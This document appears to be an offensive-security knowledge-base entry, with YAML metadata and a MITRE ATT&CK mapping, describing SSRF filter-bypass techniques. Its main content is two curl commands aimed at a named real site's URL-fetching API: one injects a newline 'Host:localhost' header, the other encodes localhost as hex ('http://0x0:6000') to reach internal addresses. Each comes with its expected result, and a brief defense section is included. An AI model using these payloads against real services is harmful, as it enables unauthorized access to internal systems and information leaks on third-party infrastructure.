---
id: proc-uuid-3
tags:
  - ssrf
  - bypass
  - injection
  - encoding
type: procedure
tools: []
tactics:
  - '[[Reconnaissance]]'
commands:
  - '[[commands/curl-bypass-newline]]'
  - '[[commands/curl-bypass-hex-ip]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T04:39:18.653Z'
skill_level: advanced
impact_level: high
detection_risk: high
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Reconnaissance]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Test-Additional-SSRF-Bypass-Techniques

## Summary

This procedure tests alternative SSRF evasion methods, such as newline injection and hexadecimal IP encoding, to probe for filter weaknesses beyond simple redirects.

## Description

Building on basic redirection, this explores payloads like '\nHost:localhost' causing 500 errors with info leaks, or 'http://0x0:6000' using hex for localhost. References include IP encoding lists. Targets SSRF filters in web APIs; outcomes reveal additional vulns.

## Requirements

1. Access to vulnerable API
2. Knowledge of encoding techniques
3. HTTP client for testing

## Defense

Defensive measures and detection strategies:

- Sanitize inputs for newlines and special encodings
- Use strict URL parsing libraries that decode variants
- Monitor for error responses indicating injection attempts

## Objectives

1. Identify filter evasion via injection
2. Test encoded IPs for internal access
3. Expand SSRF attack surface

## Instructions

### Step 1: Test Newline Injection

**Context**: Inject newline to manipulate headers and trigger internal requests.

**Command** ([[commands/curl-bypass-newline]]):
```bash
curl "https://infogram.com/api/web_resource/url?q=\\nHost:localhost"
```

> Expected: 500 error leaking server info; indicates partial bypass.

### Step 2: Test Hexadecimal IP Encoding

**Context**: Use hex (0x0 for 0.0.0.0) to obfuscate localhost.

**Command** ([[commands/curl-bypass-hex-ip]]):
```bash
curl "https://infogram.com/api/web_resource/url?q=http://0x0:6000"
```

> Expected: Response showing fetch from encoded internal address.

## MITRE ATT&CK Mapping

### Tactics

- [[Reconnaissance]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques


## Commands Used

- [[commands/curl-bypass-newline]]
- [[commands/curl-bypass-hex-ip]]

## Tools Used


## Tags

- bypass
- encoding
